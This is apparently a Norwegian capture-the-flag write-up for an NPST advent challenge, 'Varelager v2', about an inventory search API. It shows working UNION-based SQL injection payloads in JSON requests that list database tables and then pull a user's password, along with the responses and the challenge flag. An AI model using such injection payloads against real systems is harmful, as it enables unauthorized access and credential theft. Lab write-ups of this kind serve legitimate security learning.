# Luke 10 - Varelager v2

```
Alvebetjent Eline har oppgradert varelageret til v2 etter at det ble oppdaget litt muffins i versjon 1. Som en del av videreutviklingen har hun slått sammen v2 med resten av bruker-systemene til NPST, slik at det ikke trengs mange ulike databaser oppe i skyene.

Har du mulighet til å sjekke at alt funker som det skal etter Elines oppgradering?

Varelageret finner du som vanlig her, og bruk programmeringsgrensesnittnøkkel v2_vr7n0p1tf7.

Mvh Mellomleder
```

## Løsning

Igjen er det SQL injection. Denne gangen fra en annen tabell. brukertabellen

Passordet til Alvebetjent Eline er løsningsordet.

Igjen gjør vi spørringene i postman slik at debugging blir enklere.
`POST` spørring til `https://varelager.p26e.dev/api/search`

### Schema Request 
```json
{
    "search":"spilleringenrolle' UNION (SELECT null, TABLE_NAME, null, null, TABLE_SCHEMA, null FROM information_schema.columns where TABLE_SCHEMA = 'v2') ;--%;",
    "key":"v2_vr7n0p1tf7"
}
```

### Schema Response
```json
[
  {
    "id": null,
    "navn": "ting",
    "antall": null,
    "enhet": null,
    "kommentar": "v2",
    "flagg": null
  },
  {
    "id": null,
    "navn": "brukere",
    "antall": null,
    "enhet": null,
    "kommentar": "v2",
    "flagg": null
  }
]
```

### Brukertabell Request
```json
{
    "search":"spilleringenrolle' UNION (SELECT id, navn, null, null, passord, null FROM v2.brukere WHERE navn = 'Eline');--%;",
    "key":"v2_vr7n0p1tf7"
}
```

### Brukertabell Response
```json
[
  {
    "id": "5e50ae53-2f54-477c-9eea-e5ef28e9ad58",
    "navn": "Eline",
    "antall": null,
    "enhet": null,
    "kommentar": "PST{c3ce11494e56a8897b6f80d1ca3dbe}",
    "flagg": null
  }
]
```

Flagg: `PST{c3ce11494e56a8897b6f80d1ca3dbe}`